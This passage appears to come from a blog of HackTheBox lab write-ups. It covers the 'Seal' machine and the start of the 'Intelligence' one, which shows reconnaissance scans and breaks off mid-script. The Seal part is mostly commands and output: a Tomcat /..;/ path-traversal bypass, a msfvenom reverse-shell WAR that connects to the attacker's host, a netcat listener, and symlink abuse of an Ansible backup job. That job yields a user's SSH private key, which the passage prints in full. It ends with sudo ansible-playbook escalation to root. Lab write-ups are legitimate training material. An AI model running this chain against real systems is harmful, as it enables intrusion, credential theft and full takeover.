<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;user</span> <span style="color:#50fa7b">username=</span><span style="color:#f1fa8c">&#34;tomcat&#34;</span> <span style="color:#50fa7b">password=</span><span style="color:#f1fa8c">&#34;42MrHBf*z8{Z%&#34;</span> <span style="color:#50fa7b">roles=</span><span style="color:#f1fa8c">&#34;manager-gui,admin-gui&#34;</span><span style="color:#ff79c6">/&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Tomcat dashboard <strong>/manager/status</strong> does not appear to be protected with client-certificate authentication. Supplying above credentials is a Success. And we get a lot of useful information:</p>
<table>
<thead>
<tr>
<th>Tomcat Version</th>
<th>JVM Version</th>
<th>JVM Vendor</th>
<th>OS Name</th>
<th>OS Version</th>
<th>OS Architecture</th>
<th>Hostname</th>
<th>IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td>Apache Tomcat/9.0.31 (Ubuntu)</td>
<td>11.0.11+9-Ubuntu-0ubuntu2.20.04</td>
<td>Ubuntu</td>
<td>Linux</td>
<td>5.4.0-80-generic</td>
<td>amd64</td>
<td>seal</td>
<td>127.0.1.1</td>
</tr>
</tbody>
</table>
<p>I could not find a CVE, but this blog post describes a <a href="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/">tomcat path traversal vulenrability via reverse proxy</a>:</p>
<blockquote>
<p>When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency.
Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.</p>
</blockquote>
<p>And indeed, without the need of the client-certificate, I am able to access tomcat manager: <code>https://seal.htb/manager/status/..;/html</code>. From there I am able to deploy an evil WAR file with msfvenom.</p>
<pre><code>msfvenom --list payloads | grep java | grep reverse
msfvenom -p java/shell_reverse_tcp  --list-options
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 -f war -o /data/evil.war
</code></pre>
<p>I have to edit the form action field:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">form</span>
  <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span>
  <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=D1D43C74CF17A2E24CDC4E7099F68642&#34;</span>
  <span style="color:#50fa7b">enctype</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;multipart/form-data&#34;</span>
&gt;&lt;/<span style="color:#ff79c6">form</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>We start a netcat listener and we deploy the war in tomcat. Upon visit of <a href="https://seal.htb/evil/">https://seal.htb/evil/</a> we have reverse shell:</p>
<pre><code>nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 172.19.0.1 65236
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
pwd
/var/lib/tomcat9
whereis python
python: /usr/bin/python3.8 /usr/lib/python3.9 /usr/lib/python2.7 /usr/lib/python3.8 /etc/python3.8 /usr/local/lib/python3.8
/usr/bin/python3.8 -c &quot;import pty; pty.spawn('/bin/bash')&quot;
tomcat@seal:/var/lib/tomcat9$
</code></pre>
<p>We find user luis:</p>
<pre><code>tomcat@seal:/var/lib/tomcat9$ cat /etc/passwd
tomcat❌997:997:Apache Tomcat:/:/usr/sbin/nologin
luis❌1000:1000:,,,:/home/luis:/bin/bash
tomcat@seal:/var/lib/tomcat9$ ls -la /home/luis
ls -la /home/luis
total 51320
drwxr-xr-x 9 luis luis     4096 May  7 07:01 .
drwxr-xr-x 3 root root     4096 May  5 12:52 ..
drwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible
lrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -&gt; /dev/null
-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout
-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc
drwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache
drwxrwxr-x 3 luis luis     4096 May  5 13:45 .config
drwxrwxr-x 6 luis luis     4096 Oct 25 07:12 .gitbucket
-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war
drwxrwxr-x 3 luis luis     4096 May  5 13:41 .java
drwxrwxr-x 3 luis luis     4096 May  5 14:33 .local
-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile
drwx------ 2 luis luis     4096 May  7 06:10 .ssh
-r-------- 1 luis luis       33 Oct 25 07:12 user.txt
</code></pre>
<p>We can download the client side certificate:</p>
<pre><code>tomcat@seal:/var/lib/tomcat9/conf$  cat /var/www/keys/selfsigned-ca.crt
 cat /var/www/keys/selfsigned-ca.crt
-----BEGIN CERTIFICATE-----
MIID9TCCAt2gAwIBAgIUBOB6OYUwe6jSIzw6c16KyacbuXcwDQYJKoZIhvcNAQEL
BQAwgYkxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xEDAOBgNVBAcMB2hh
Y2tuZXkxFTATBgNVBAoMDFNlYWwgUHZ0IEx0ZDEOMAwGA1UECwwFSW5mcmExETAP
BgNVBAMMCHNlYWwuaHRiMR0wGwYJKoZIhvcNAQkBFg5hZG1pbkBzZWFsLmh0YjAe
Fw0yMTA1MDUxMDIyMTJaFw0zMTA1MDMxMDIyMTJaMIGJMQswCQYDVQQGEwJVSzEP
MA0GA1UECAwGTG9uZG9uMRAwDgYDVQQHDAdoYWNrbmV5MRUwEwYDVQQKDAxTZWFs
IFB2dCBMdGQxDjAMBgNVBAsMBUluZnJhMREwDwYDVQQDDAhzZWFsLmh0YjEdMBsG
CSqGSIb3DQEJARYOYWRtaW5Ac2VhbC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQC8U1tMadRl3C/5LgPfjvSlXJgvfu5UUyBG5XMnMeHE9L2Un1xa
S31zCuHhvfMuIJzRNKIarpRtdBauZxe8/vGxu+xzi9KBfIYHE112va1OsokqqTUP
qxRV36cqVpkKVUZiIeNbDFCxfY22WZO9vzBzXWrwjtvPiex0IHXU134xI06AkD3M
aANB/YfEB2i4NOnrac49aj3gpTjA070WqdGo4kGx6odjsHrMHzi7vaR0JoOhDsw6
HxR22tGaqlH39zQtC2EjxPkSVP2SofFDmxr/iYwIVdDH6Fie5XEWse+BNeQMU5Vk
WTZ5LME0793j7YYdR20SYMaGgv3sP/ex4djXAgMBAAGjUzBRMB0GA1UdDgQWBBT6
arSNOx5QDRjz0iqoE+edZZVCSzAfBgNVHSMEGDAWgBT6arSNOx5QDRjz0iqoE+ed
ZZVCSzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAlZ3mMtdPH
eIge5rKIko1ozfQc7ToiRm9y3cDkuMHpGmZkCCWEHpRpNkeZ9Zm91QLgyrM6vyPk
MaKObG7YKqQOl4WTjvLEQAjnE7AZWGIdETOCD0yD7fja0AzSJrbnYHSN0hD763xA
lOW5XK1kp4XKJgMg56Op1S8Lqz8teLH8Id/+AP51z9tQFnhsVXKP7nUb03qWwoEc
alIK26/kNfafEi46C/3VPQ7YiY38lILo+OhI4nWVw1gIfrtxgcJl+UZJSHLCKa3m
J6ZL+YFeqwpyND/Ywrfrmky+QLMZdkqAa16b+rtXNxQlwnSwD41hRF4IXz7qupD0
UpzLgi5sAUnE
-----END CERTIFICATE-----
</code></pre>
<p>Looking at interesting processes we find:</p>
<pre><code>tomcat@seal:/var/lib/tomcat9/conf$ ps -aux --forest | grep luis
luis        1120  0.0  0.0   2608   540 ?        Ss   07:11   0:00  |   \_ /bin/sh -c java -jar /home/luis/gitbucket.war
luis        1122  0.7 10.0 3654680 406952 ?      Sl   07:11   2:16  |       \_ java -jar /home/luis/gitbucket.war
root       56850  0.0  0.0   2608   604 ?        Ss   12:16   0:00      \_ /bin/sh -c sleep 30 &amp;&amp; sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
</code></pre>
<p>We can download the run.yml playbook, and we can see that it will copy everything from the tomcat dashboard directory, including symlinks (see row 6: <code>copy_links=yes</code>):</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">tomcat@seal:/var/lib/tomcat9/conf$ cat /opt/backups/playbook/run.yml
cat /opt/backups/playbook/run.yml
- <span style="color:#ff79c6">hosts</span>: localhost
  <span style="color:#ff79c6">tasks</span>:
  - <span style="color:#ff79c6">name</span>: Copy Files
    <span style="color:#ff79c6">synchronize</span>: src=https://0xade1.github.io/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - <span style="color:#ff79c6">name</span>: Server Backups
    <span style="color:#ff79c6">archive</span>:
      <span style="color:#ff79c6">path</span>: /opt/backups/files/
      <span style="color:#ff79c6">dest</span>: <span style="color:#f1fa8c">&#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&#34;</span>
  - <span style="color:#ff79c6">name</span>: Clean
    <span style="color:#ff79c6">file</span>:
      <span style="color:#ff79c6">state</span>: absent
      <span style="color:#ff79c6">path</span>: /opt/backups/files/
</code></pre></td></tr></table>
</div>
</div><p>We can try to copy user.txt and .ssh folder by creating a symlink in a writable folder. uploads folder is a good candidate:</p>
<pre><code>tomcat@seal:/var/lib/tomcat9$ cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -la
ls -la
total 100
drwxr-xr-x 7 root root  4096 May  7 09:26 .
drwxr-xr-x 3 root root  4096 May  6 10:48 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6 10:42 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 May  7 09:26 upload
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ cd uploads
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/user.txt
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh
</code></pre>
<p>Now we can explore the destination and wait for the cron job to execute. We got the .ssh but not the user flag.</p>
<pre><code>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ cd /opt/backups
tomcat@seal:/opt/backups$ date
Mon 25 Oct 2021 12:39:12 PM UTC
tomcat@seal:/opt/backups$ ls archives
backup-2021-10-25-12:40:33.gz
tomcat@seal:/opt/backups$ cp archives/backup-2021-10-25-12:40:33.gz /dev/shm
tomcat@seal:/dev/shm$ gunzip backup-2021-10-25-12:40:33.gz
tomcat@seal:/dev/shm$ file backup-2021-10-25-12:40:33
backup-2021-10-25-12:40:33: POSIX tar archive
tomcat@seal:/dev/shm$ tar xvf 'backup-2021-10-25-12:40:33'
tomcat@seal:/dev/shm$ mv backup* backup
tomcat@seal:/dev/shm$ tar xvf backup
[..]
dashboard/uploads/.ssh/
dashboard/uploads/.ssh/id_rsa
dashboard/uploads/.ssh/id_rsa.pub
dashboard/uploads/.ssh/authorized_keys
[..]
</code></pre>
<h2 id="shell-as-luis">Shell as Luis</h2>
<p>And we can see that luis is using his public key to login his machine in SSH,</p>
<pre><code>tomcat@seal:/dev/shm/dashboard$ cat ./uploads/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzeQhIJ510ppwJCFVylNNVwvEz2raJArOL2GyeUS3RnuRyFmtJmwYOQgPv2D/heuegpeba53SCZnF1UlQBDfcqDc2TpzMMjTB6+v9h8GkKRebmuyd+jnOMS5UagxMmE1nyI67uwINlkDqxfjw4W24XrO5SAWrMet0etHj5gVrCA/w6An01aRqmaa2STFwRsXifX6/+X7viQSa2LuNOJNJCA+v9OhN29C3DXb5hp9W0SQH/yKkScAigP8Hok453ik9M2BfxEw9Yf3eZK2upuWcw5Ym2j1ikvGEzje/0joRSN7yCn8RxKu8cMF7MQQzNlL4htw/6GfDl6Vp24ua11NIw9MJaSkj2Fcc1T2eNwP5NFH8D3RUep2ouVomSAL3OlFcHbT3oNXEVh04tyOB43etycIASFDvlWwQdcT80eA7zOMPajdycA7OwzJCuo1e09r6oeNUNyH9PVONKUJbEAUfL84g/EG6kT+RsSjLX50ke5H6ASnrIyV+oXIRWFRsOrKE= luis@seal

tomcat@seal:/dev/shm/dashboard$ cat ./uploads/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzeQhIJ510ppwJCFVylNNVwvEz2raJArOL2GyeUS3RnuRyFmtJmwYOQgPv2D/heuegpeba53SCZnF1UlQBDfcqDc2TpzMMjTB6+v9h8GkKRebmuyd+jnOMS5UagxMmE1nyI67uwINlkDqxfjw4W24XrO5SAWrMet0etHj5gVrCA/w6An01aRqmaa2STFwRsXifX6/+X7viQSa2LuNOJNJCA+v9OhN29C3DXb5hp9W0SQH/yKkScAigP8Hok453ik9M2BfxEw9Yf3eZK2upuWcw5Ym2j1ikvGEzje/0joRSN7yCn8RxKu8cMF7MQQzNlL4htw/6GfDl6Vp24ua11NIw9MJaSkj2Fcc1T2eNwP5NFH8D3RUep2ouVomSAL3OlFcHbT3oNXEVh04tyOB43etycIASFDvlWwQdcT80eA7zOMPajdycA7OwzJCuo1e09r6oeNUNyH9PVONKUJbEAUfL84g/EG6kT+RsSjLX50ke5H6ASnrIyV+oXIRWFRsOrKE= luis@seal
</code></pre>
<p>so we just need his private key to remotely SSH.</p>
<pre><code>tomcat@seal:/dev/shm/dashboard$ cat ./uploads/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
</code></pre>
<p>and then we get the user flag and proper shell 😄</p>
<pre><code>$ echo &quot;&lt;PRIVATE KEY&gt;&quot; &gt; id_rsa_seal
$ chmod 600 id_rsa_seal
$ ssh -i id_rsa_seal luis@seal.htb
luis@seal:~$ cat user.txt
eeffaf92bb67c9d686b14e7e7c65a932
</code></pre>
<p>We find in sudoers file that luis can execute any ansible-playbook:</p>
<pre><code>luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
</code></pre>
<p>GTFObins gives us an easy privilege escalation for <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/">ansible-playbook</a>:</p>
<pre tabindex="0"><code>TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]' &gt;$TF
sudo ansible-playbook $TF
[..]
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
b0e46a290f728edbff2bf7f0bda53663
</code></pre>]]></content></item><item><title>HTB - Intelligence</title><link>https://0xade1.github.io/posts/2021/10/htb-intelligence/</link><pubDate>Sat, 23 Oct 2021 21:33:15 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-intelligence/</guid><description>Reckon port scan rustscan -a 10.10.10.248 -t 2000 -- -Pn -A -sCV [..] Open 10.10.10.248:53 Open 10.10.10.248:80 Open 10.10.10.248:88 Open 10.10.10.248:135 Open 10.10.10.248:139 Open 10.10.10.248:389 Open 10.10.10.248:445 Open 10.10.10.248:464 Open 10.10.10.248:593 Open 10.10.10.248:636 nmap -p53,80,88,135,139,389,445,464,593,636 -sCV -A 10.10.10.248 [..] PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |\_ Potentially risky methods: TRACE |\_http-server-header: Microsoft-IIS/10.0 |\_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-23 20:31:43Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.</description><content type="html"><![CDATA[<h2 id="reckon">Reckon</h2>
<h3 id="port-scan">port scan</h3>
<pre><code>rustscan -a 10.10.10.248 -t 2000 -- -Pn -A -sCV
[..]
Open 10.10.10.248:53
Open 10.10.10.248:80
Open 10.10.10.248:88
Open 10.10.10.248:135
Open 10.10.10.248:139
Open 10.10.10.248:389
Open 10.10.10.248:445
Open 10.10.10.248:464
Open 10.10.10.248:593
Open 10.10.10.248:636

nmap -p53,80,88,135,139,389,445,464,593,636 -sCV -A 10.10.10.248
[..]
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
| http-methods:
|\_ Potentially risky methods: TRACE
|\_http-server-header: Microsoft-IIS/10.0
|\_http-title: Intelligence
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-23 20:31:43Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|\_Not valid after: 2022-04-19T00:43:16
|\_ssl-date: 2021-10-23T20:32:32+00:00; +7h00m01s from scanner time.
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|\_Not valid after: 2022-04-19T00:43:16
|\_ssl-date: 2021-10-23T20:32:31+00:00; +7h00m00s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre>
<h3 id="dns-tcp53">DNS TCP/53</h3>
<p>DNS exploration did not reveal anything new. Zone transfer failed and 10.10.10.48 is not even able to resolve its name:</p>
<pre><code>nslookup
&gt; server 10.10.10.248
Default server: 10.10.10.248
Address: 10.10.10.248#53
&gt; 10.10.10.248
** server can't find 248.10.10.10.in-addr.arpa: SERVFAIL
</code></pre>
<p>dig</p>
<pre><code>dig dc.intelligence.htb @10.10.10.248
[..]
dc.intelligence.htb.    1200    IN      A       10.10.10.248
</code></pre>
<p>dnsenum</p>
<pre><code>dnsenum --dnsserver 10.10.10.248 \
-f /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-o scans/dnsenum-bitquark-intelligence.htb intelligence.htb
dnsenum VERSION:1.2.6
[..]
intelligence.htb.                        600      IN    A        10.10.10.248
dc.intelligence.htb.                     1200     IN    A        10.10.10.248
</code></pre>
<h3 id="http-tcp80">http TCP/80</h3>
<p>There is two dummy pdfs available on the homepage, nothing else:</p>
<ul>
<li><a href="http://intelligence.htb/documents/2020-01-01-upload.pdf">http://intelligence.htb/documents/2020-01-01-upload.pdf</a></li>
<li><a href="http://intelligence.htb/documents/2020-12-15-upload.pdf">http://intelligence.htb/documents/2020-12-15-upload.pdf</a></li>
</ul>
<pre tabindex="0"><code>$ gobuster dir -u http://intelligence.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 30
/documents (Status: 301)
[..]
$ gobuster vhost -u http://intelligence.htb -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 30
</code></pre><p>The documents follow a certain pattern: YYYY-mm-dd-upload.pdf, let&rsquo;s try every days in year 2020 with this dummp_pdf.py script:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
